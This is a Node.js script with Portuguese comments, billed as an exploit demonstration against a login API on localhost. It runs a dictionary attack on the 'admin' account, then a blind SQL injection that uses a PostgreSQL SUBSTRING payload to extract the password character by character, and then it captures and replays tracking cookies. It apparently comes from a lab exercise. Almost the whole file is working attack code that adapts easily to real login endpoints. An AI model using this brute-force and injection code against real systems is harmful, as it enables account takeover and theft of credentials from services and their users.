const axios = require('axios');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');

const API_URL = 'http://localhost:3000/api/login';
const TARGET_USER = 'admin';
const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=';
const MAX_LENGTH = 30;
const DICTIONARY_PATH = path.join(__dirname, 'password-dictionary.txt');

// Função para tentativa de login
async function attemptLogin(username, password) {
    try {
        const response = await axios.post(API_URL, {
            username: username,
            password: password
        });

        return response.data;
    } catch (err) {
        console.error('Erro na requisição:', err.message);
        return { success: false };
    }
}

// Função para tentativa de login com SQL injection
async function attemptLoginInjection(payload) {
    try {
        const response = await axios.post(API_URL, {
            username: payload,
            password: 'anything'
        });

        return response.data;
    } catch (err) {
        console.error('Erro na requisição de injeção:', err.message);
        return { success: false };
    }
}

// Ataque de dicionário
async function dictionaryAttack() {
    console.log(chalk.blueBright(`\nIniciando ataque de dicionário contra ${TARGET_USER}...`));

    try {
        // Lendo o arquivo de dicionário
        const passwords = fs.readFileSync(DICTIONARY_PATH, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);

        console.log(chalk.yellow(`Dicionário carregado com ${passwords.length} senhas para testar.`));

        let found = false;
        let foundPassword = '';

        for (let i = 0; i < passwords.length; i++) {
            const password = passwords[i];
            process.stdout.write(chalk.gray(`Testando senha [${i+1}/${passwords.length}]: ${password}\r`));

            const result = await attemptLogin(TARGET_USER, password);

            if (result.success) {
                found = true;
                foundPassword = password;
                console.log(chalk.green(`\n✔ Senha encontrada para ${TARGET_USER}: ${chalk.bold(password)}`));
                break;
            }

            // Pequeno delay para não sobrecarregar o servidor
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        if (!found) {
            console.log(chalk.red(`\nNenhuma senha do dicionário funcionou para ${TARGET_USER}.`));
        }

        return { found, password: foundPassword };
    } catch (err) {
        console.error('Erro no ataque de dicionário:', err.message);
        return { found: false, password: '' };
    }
}

// Ataque de injeção SQL cega para extrair a senha
async function extractPassword() {
    console.log(chalk.blueBright(`\nIniciando ataque de injeção SQL cega contra ${TARGET_USER}...`));
    let extractedPassword = '';
    let finished = false;

    for (let i = 1; i <= MAX_LENGTH && !finished; i++) {
        console.log(chalk.yellow(`\n[Posição ${i}] Testando caracteres...`));
        let found = false;

        for (const char of CHARS) {
            // Ajuste para sintaxe PostgreSQL
            const payload = `${TARGET_USER}' AND SUBSTRING(password FROM ${i} FOR 1) = '${char}' --`;
            process.stdout.write(chalk.gray(`Testando: '${char}'\r`));
            const result = await attemptLoginInjection(payload);

            if (result.success) {
                extractedPassword += char;
                found = true;
                console.log(chalk.green(`\n✔ Caractere encontrado na posição ${i}: '${char}'`));
                console.log(chalk.cyanBright(`Senha parcial: ${chalk.bold(extractedPassword)}`));
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        if (!found) {
            console.log(chalk.red(`\nNenhum caractere encontrado na posição ${i}, extração finalizada.`));
            finished = true;
        }
    }

    if (extractedPassword.length > 0) {
        console.log(chalk.bgGreen.black(`\nSenha extraída para ${TARGET_USER}: ${extractedPassword}`));
    } else {
        console.log(chalk.bgRed.white(`\nFalha ao extrair a senha.`));
    }
    return extractedPassword;
}

// Função para extrair cookies de rastreamento
async function extractTrackingCookies() {
    try {
        console.log("\nExtraindo cookies de rastreamento...");

        // Primeira requisição para obter cookies iniciais (na rota raiz, onde o cookie é setado)
        const firstResponse = await axios.get('http://localhost:3000/', {
            withCredentials: true
        });

        const cookies = firstResponse.headers['set-cookie'] || [];
        if (cookies.length === 0) {
            console.log(chalk.redBright("Nenhum cookie de rastreamento recebido!\n" +
                "Dica: Verifique manualmente no navegador em Application > Cookies para visualizar o trackingId."));
        } else {
            console.log(chalk.greenBright("Cookies de rastreamento obtidos:"), cookies);
        }

        // Múltiplas requisições para demonstrar o rastreamento de cookies
        for (let i = 0; i < 3; i++) {
            console.log(`\nFazendo requisição ${i+1} com cookies existentes...`);

            const response = await axios.get('http://localhost:3000/', {
                headers: {
                    Cookie: cookies.join('; ')
                }
            });

            // O servidor vai registrar o ID de rastreamento repetido
            console.log("Requisição bem-sucedida, o servidor está rastreando esta sessão");

            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        return cookies;
    } catch (err) {
        console.error("Erro ao extrair cookies de rastreamento:", err.message);
        return [];
    }
}

async function runExploitDemo() {
    console.log(chalk.bgYellow.black("DEMONSTRAÇÃO DE EXPLORAÇÃO: DICIONÁRIO, SQL INJECTION E COOKIES"));
    console.log("=================================================================\n");

    // PARTE 1: Ataque de dicionário
    console.log(chalk.bgBlue.white("PARTE 1: ATAQUE DE DICIONÁRIO"));
    const dictionaryResult = await dictionaryAttack();

    // PARTE 2: Só continua com o SQL Injection se o dicionário falhar
    if (!dictionaryResult.found) {
        console.log(chalk.bgBlue.white("\nPARTE 2: ATAQUE DE INJEÇÃO SQL CEGA"));
        console.log(chalk.yellow("O ataque de dicionário falhou, tentando SQL Injection..."));
        const password = await extractPassword();
        console.log(`\nSenha extraída para ${TARGET_USER}: ${password}`);
    } else {
        console.log(chalk.green("\nAtaque de dicionário bem-sucedido! Pulando SQL Injection."));
    }

    // PARTE 3: Demonstração de cookies de rastreamento
    console.log(chalk.bgBlue.white("\nPARTE 3: EXPLORAÇÃO DE COOKIES DE RASTREAMENTO"));
    const trackingCookies = await extractTrackingCookies();

    console.log("\nDemonstração de exploração concluída!");
    console.log("=================================================================");
}

// Executar a demonstração
runExploitDemo();
